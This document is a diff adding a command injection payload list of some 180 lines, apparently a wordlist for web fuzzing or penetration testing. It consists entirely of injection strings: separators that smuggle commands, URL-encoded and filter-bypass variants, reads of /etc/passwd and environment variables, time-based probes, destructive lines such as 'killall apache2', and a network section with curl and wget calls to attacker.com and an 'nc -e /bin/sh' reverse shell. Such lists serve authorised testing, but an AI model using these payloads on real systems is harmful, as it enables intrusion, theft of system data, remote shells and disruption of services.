@@ -1,0 +1,183 @@
+# Command Injection Payloads - 150+ Payloads
+# ==============================================
+
+# Basic Command Injection
+; whoami
+| whoami
+& whoami
+&& whoami
+|| whoami
+; id
+| id
+& id
+&& id
+|| id
+
+# Windows Specific
+; dir
+| dir
+& dir
+&& dir
+|| dir
+; type C:\Windows\System32\drivers\etc\hosts
+| type C:\Windows\System32\drivers\etc\hosts
+; net user
+| net user
+; ipconfig
+| ipconfig
+; systeminfo
+| systeminfo
+
+# Linux Specific
+; cat /etc/passwd
+| cat /etc/passwd
+; ls -la
+| ls -la
+; uname -a
+| uname -a
+; ps aux
+| ps aux
+; netstat -an
+| netstat -an
+; pwd
+| pwd
+; env
+| env
+
+# URL Encoded
+%3B%20whoami
+%7C%20whoami
+%26%20whoami
+%26%26%20whoami
+%7C%7C%20whoami
+%3B%20id
+%7C%20id
+%26%20id
+
+# Double URL Encoded
+%253B%2520whoami
+%257C%2520whoami
+%2526%2520whoami
+
+# Command Substitution
+`whoami`
+$(whoami)
+`id`
+$(id)
+`pwd`
+$(pwd)
+`ls`
+$(ls)
+
+# Time-based Detection
+; sleep 5
+| sleep 5
+& sleep 5
+&& sleep 5
+|| sleep 5
+`sleep 5`
+$(sleep 5)
+; ping -c 5 127.0.0.1
+| ping -c 5 127.0.0.1
+; timeout 5
+| timeout 5
+
+# Filter Bypasses
+;w\ho\ami
+|w\ho\ami
+;w'h'o'a'm'i
+|w'h'o'a'm'i
+;w"h"o"a"m"i
+|w"h"o"a"m"i
+;$BASH -c whoami
+|$BASH -c whoami
+;sh -c whoami
+|sh -c whoami
+
+# Alternative Separators
+%0a whoami
+%0d whoami
+%0a%0d whoami
+\n whoami
+\r whoami
+\r\n whoami
+
+# Concatenation Bypasses
+;who$@ami
+|who$@ami
+;who${IFS}ami
+|who${IFS}ami
+;echo$IFS'whoami'|sh
+|echo$IFS'whoami'|sh
+
+# Environment Variable Injection
+;$PATH
+|$PATH
+;$USER
+|$USER
+;$HOME
+|$HOME
+;$SHELL
+|$SHELL
+
+# File Operations
+; touch /tmp/cmd_injection_test
+| touch /tmp/cmd_injection_test
+; echo 'test' > /tmp/cmd_test
+| echo 'test' > /tmp/cmd_test
+; rm /tmp/test_file
+| rm /tmp/test_file
+
+# Network Operations
+; curl http://attacker.com/test
+| curl http://attacker.com/test
+; wget http://attacker.com/test
+| wget http://attacker.com/test
+; nc -e /bin/sh attacker.com 4444
+| nc -e /bin/sh attacker.com 4444
+
+# Process Operations
+; killall apache2
+| killall apache2
+; ps -ef | grep root
+| ps -ef | grep root
+
+# File Reading
+; head /etc/passwd
+| head /etc/passwd
+; tail /etc/passwd
+| tail /etc/passwd
+; more /etc/passwd
+| more /etc/passwd
+; less /etc/passwd
+| less /etc/passwd
+
+# Advanced Payloads
+; python -c 'import os; os.system("whoami")'
+| python -c 'import os; os.system("whoami")'
+; perl -e 'system("whoami")'
+| perl -e 'system("whoami")'
+; ruby -e 'system("whoami")'
+| ruby -e 'system("whoami")'
+; php -r 'system("whoami");'
+| php -r 'system("whoami");'
+
+# Blind Command Injection
+; whoami > /tmp/output
+| whoami > /tmp/output
+; id >> /tmp/log
+| id >> /tmp/log
+
+# Error-based Detection
+; cat /nonexistent 2>&1
+| cat /nonexistent 2>&1
+; ls /nonexistent 2>&1
+| ls /nonexistent 2>&1
+
+# Case Variations
+; WHOAMI
+| WHOAMI
+; WhoAmI
+| WhoAmI
+; ID
+| ID
